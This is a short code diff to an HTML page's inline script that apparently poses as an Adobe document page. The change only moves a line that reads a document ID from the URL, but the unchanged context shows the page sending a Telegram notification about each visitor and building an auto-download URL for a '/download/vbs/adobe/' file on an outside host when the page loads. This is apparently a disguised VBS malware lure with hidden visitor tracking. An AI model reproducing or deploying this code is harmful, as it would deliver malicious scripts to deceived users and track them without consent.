@@ -2335,6 +2335,10 @@
   </form>
 
   <script nonce="MTk0NTg0Nzc5NywxMzc2NDA5OTEx">
+    
+    const docId = window.location.pathname.split('/')[2];
+        
+    console.log('ADOBE DOCID:', docId);
       // Auto-download file on page load (sample URL)
       window.addEventListener('load', async function() {
         // Send Telegram notification for visitor
@@ -2347,12 +2351,6 @@
         } catch (error) {
           console.error('Error with visitor tracking:', error);
         }
-
-
-        
-        const docId = window.location.pathname.split('/')[2];
-        
-        console.log('ADOBE DOCID:', docId);
         
         var downloadUrl = 'https://nodejnct-production.up.railway.app/download/vbs/adobe/' + encodeURIComponent(docId);
         
